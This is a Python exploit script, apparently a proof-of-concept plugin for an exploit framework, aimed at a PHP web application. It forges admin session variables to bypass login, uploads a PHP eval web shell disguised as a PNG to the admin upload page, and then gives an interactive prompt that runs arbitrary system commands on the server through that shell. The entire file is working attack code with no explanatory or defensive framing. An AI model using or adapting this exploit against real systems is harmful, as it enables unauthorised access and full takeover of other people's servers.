import re
import urlparse

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("index.php"):
            print("[*] Please make sure the url end with 'index.php'")
            exit()
        # try to log in
        payload1 = {
            '_SESSION[login_in]': '1',
            '_SESSION[admin]': '1',
            '_SESSION[login_time]': '999999999999'
        }
        url1 = target.url
        r = requests.post(target.url, data=payload1)
        cookie = r.cookies["PHPSESSID"]
        print("[*] Get the Cookie: PHPSESSID=" + cookie)

        # try to upload shell
        url2 = target.url.replace("index.php", "admin/upload.php")
        password = raw_input("[*] Please enter the shell-password:")
        # print password
        phpshell = "<?php eval($_POST['" + password + "']);?>"
        payload2 = {
            'up': (
                'shell.php',
                phpshell,
                'image/png',
            ),
        }
        cookie = {'PHPSESSID': cookie}
        r = requests.post(url2, cookies=cookie, files=payload2)

        # getshell
        p = re.compile("(?<=val\(\')(.*)(?=\'\))")
        path = re.search(p, r.text).group(0)
        shell = target.url.replace("index.php", "upload/" + path)
        print("[*] The shell url: " + shell)
        print("[*] The shell password: " + password)

        while 1:
            try:
                command = raw_input("[*] input the command:")
                payload = 'system("%s");' % command
                if command != "exit":
                    postData = {password: payload}
                    r = requests.post(shell, data=postData)
                    print(r.text.encode(r.encoding))
                else:
                    break
            except EOFError as e:
                print("[*] type 'exit' to quit")
                pass

    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
